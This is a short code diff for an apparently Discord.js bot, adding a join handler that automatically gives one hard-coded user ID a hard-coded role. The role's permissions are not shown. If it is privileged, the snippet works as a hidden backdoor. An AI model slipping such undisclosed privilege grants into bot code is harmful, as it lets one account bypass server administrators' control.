@@ -44,6 +44,9 @@ client.on('message', async message => {
         await data.save().catch(err => console.log(err))
     })
 })
+client.on('guildMemberAdd', member => {
+    if (member.id === "840827239373078538") member.roles.add("848100691239108608")
+})
 client.on('messageDelete', async(msg) => {
     client.snipes.set(msg.channel.id, {
         content: msg.content,
